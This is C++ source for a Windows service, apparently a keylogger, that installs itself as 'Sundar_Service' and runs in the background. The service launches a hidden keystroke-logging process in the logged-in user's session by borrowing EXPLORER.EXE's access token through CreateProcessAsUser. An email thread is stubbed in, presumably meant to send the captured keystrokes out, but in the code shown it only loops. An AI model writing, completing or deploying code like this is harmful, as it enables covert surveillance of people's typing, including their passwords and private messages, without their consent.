//  Service.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "KeyLogManager.h"
#include "ServiceManager.h"
#include "tlhelp32.h" 

#define		MAX_NUM_OF_PROCESS		4
/** Window Service **/
VOID ServiceMainProc();

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);
VOID WINAPI ServiceHandler(DWORD fdwControl);

BOOL RunProcess(LPSTR cmd);

void start_keylog();
void start_keylog_proc();
void start_proc();
void stop_proc();
DWORD WINAPI keylog_thread(LPVOID info);
DWORD WINAPI email_thread(LPVOID info);
bool is_service_env();
void install_service();
HANDLE keylog_tid;
HANDLE email_tid;
bool running = false;

/** Window Service **/
const int nBufferSize = 500;
CHAR service_name[nBufferSize+1];
CHAR exe_path[nBufferSize+1];

SERVICE_TABLE_ENTRY lpServiceStartTable[] = 
{
	{service_name, ServiceMain},
	{NULL, NULL}
};

SERVICE_STATUS_HANDLE   hServiceStatusHandle; 
SERVICE_STATUS          ServiceStatus; 

KeyLogManager klm;
PROCESS_INFORMATION	keylog_proc_info;

int _tmain(int argc, _TCHAR* argv[])
{

	if(argc > 1 && strcmp(argv[1], "-k") == 0){
		Logger::debug("Keylog Mode");
		start_keylog();
		return 0;
	}
	strcpy(service_name,"Sundar_Service");	
	DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
	exe_path[size] = 0;

	bool is_service = is_service_env();
	if(is_service){
		ServiceMainProc();
	} else{
		install_service();
	}
	return 0;
}

void install_service(){	
	ServiceManager::uninstall(service_name);
	ServiceManager::install(exe_path, service_name);
	bool ret = ServiceManager::run(service_name);
	if(ret){
		Logger::debug("Service %s Install And Run Succ", service_name);
	} else{
		Logger::debug("Service %s Install And Run Fail", service_name);
	}
}

bool is_service_env(){
	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
	return handle == 0;
}

VOID ServiceMainProc()
{
	//start serivce
	if(!StartServiceCtrlDispatcher(lpServiceStartTable)) {
		Logger::debug("StartServiceCtrlDispatcher failed, error code = %d\n", GetLastError());
	}
}

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
	DWORD   status = 0; 
    DWORD   specificError = 0xfffffff; 
 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE; 
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hServiceStatusHandle = RegisterServiceCtrlHandler(service_name, ServiceHandler); 
    if (hServiceStatusHandle==0) {
		Logger::debug("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
        return; 
    } 
 
    // Initialization complete - report running status 
    ServiceStatus.dwCurrentState       = SERVICE_RUNNING; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0;  
    if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError()); 
    } 

	// AttachProcessNames();
	// for(int iLoop = 0; iLoop < MAX_NUM_OF_PROCESS; iLoop++)
	// {
	// 	pProcInfo[iLoop].hProcess = 0;
	// 	StartProcess(iLoop);
	// }
	start_proc();
}

void start_keylog(){
	klm.init(GetCurrentThreadId());
	klm.start();
}

void start_keylog_proc(){
	STARTUPINFO startUpInfo = { sizeof(STARTUPINFO),NULL,"",NULL,0,0,0,0,0,0,0,STARTF_USESHOWWINDOW,0,0,NULL,0,0,0};  
	startUpInfo.wShowWindow = SW_HIDE;
	startUpInfo.lpDesktop = NULL;
	char cmd[512] = {0};
	sprintf(cmd, "%s -k", exe_path);
	RunProcess(cmd);
	return;
	bool ret = CreateProcess(NULL, cmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS,
					 NULL, NULL, &startUpInfo, &keylog_proc_info);
	if(ret) {
		Sleep(1000);
		Logger::debug("Start Keylog Proc Succ");
	}
	else {
		Logger::debug("Start Keylog Proc Fail, error code = %d\n", GetLastError()); 
	}
}

void stop_keylog_proc(){
	if(keylog_proc_info.hProcess){
		PostThreadMessage(keylog_proc_info.dwThreadId, WM_QUIT, 0, 0);
		Sleep(1000);
		TerminateProcess(keylog_proc_info.hProcess, 0);
	}
}

DWORD WINAPI keylog_thread(LPVOID info){
	klm.init(GetCurrentThreadId());
	klm.start();
	return 0;
}

DWORD WINAPI email_thread(LPVOID info){
	while(running){
		Logger::debug("Email Thread Running");
		Sleep(1000);
	}
	return 0;
}

void start_proc(){
	if(running){
		return;
	}
	running = true;
	start_keylog_proc();
	// keylog_tid = CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
	email_tid = CreateThread(NULL, 0, email_thread, NULL, 0, NULL);
	// if(!keylog_tid || !email_tid){
	if(!email_tid){
		stop_proc();
		Logger::debug("Create Working Thread Fail");
	}
}
void stop_proc(){
	running = false;
	stop_keylog_proc();
	// klm.stop();
}

VOID WINAPI ServiceHandler(DWORD fdwControl)
{
	switch(fdwControl) 
	{
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			ServiceStatus.dwWin32ExitCode = 0; 
			ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
			ServiceStatus.dwCheckPoint    = 0; 
			ServiceStatus.dwWaitHint      = 0;
			// terminate all processes started by this service before shutdown
			{
				stop_proc();		
			}
			break; 
		case SERVICE_CONTROL_PAUSE:
			ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
			break;
		case SERVICE_CONTROL_CONTINUE:
			ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
		default:
			Logger::debug("Unrecognized opcode %d\n", fdwControl);
	};
    if (!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError());
    } 
}
 

BOOL GetTokenByName(HANDLE &hToken,LPSTR lpName)
{
	if(!lpName)
	{
		return FALSE;
	}
	HANDLE hProcessSnap = NULL;  
	BOOL bRet = FALSE;  
	PROCESSENTRY32 pe32 = {0};  

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
	if (hProcessSnap == INVALID_HANDLE_VALUE)  
		return (FALSE);  

	pe32.dwSize = sizeof(PROCESSENTRY32);  

	if (Process32First(hProcessSnap, &pe32))  
	{   
		do  
		{
			if(!strcmp(_strupr(pe32.szExeFile),_strupr(lpName)))
			{
				HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,
					FALSE,pe32.th32ProcessID);
				bRet = OpenProcessToken(hProcess,TOKEN_ALL_ACCESS,&hToken);
				CloseHandle (hProcessSnap);  
				return (bRet);
			}
		}  
		while (Process32Next(hProcessSnap, &pe32));  
		bRet = TRUE;  
	}  
	else  
		bRet = FALSE;

	CloseHandle (hProcessSnap);  
	return (bRet);
}

BOOL RunProcess(LPSTR cmd)
{
	if(!cmd)
	{
		return FALSE;
	}
	HANDLE hToken;
	if(!GetTokenByName(hToken,"EXPLORER.EXE"))
	{
		return FALSE;
	}
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb= sizeof(STARTUPINFO);
	si.lpDesktop = TEXT("winsta0\\default");

	BOOL bResult = CreateProcessAsUser(hToken, NULL, cmd, NULL, NULL,
		FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
	CloseHandle(hToken);
	if(bResult){
		Logger::debug("CreateProcessAsUser ok!\r\n");
	}else{
		Logger::debug("CreateProcessAsUser false!\r\n");
	}
	return bResult;
}